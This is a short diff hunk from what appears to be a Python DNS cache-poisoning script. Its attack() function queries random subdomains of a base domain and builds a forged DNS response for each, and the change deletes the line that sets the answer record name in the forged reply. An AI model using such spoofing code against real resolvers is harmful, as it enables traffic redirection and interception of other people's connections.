@@ -74,7 +74,6 @@ def attack():
         url = getRandomSubDomain() + '.' + base_domain
         dns_request[DNS].qd.qname = url
         fake_response[DNS].qd.qname = url
-        fake_response[DNS].an.rrname = url
         print "Now trying %s\n" % url
         print fake_response.show()
 
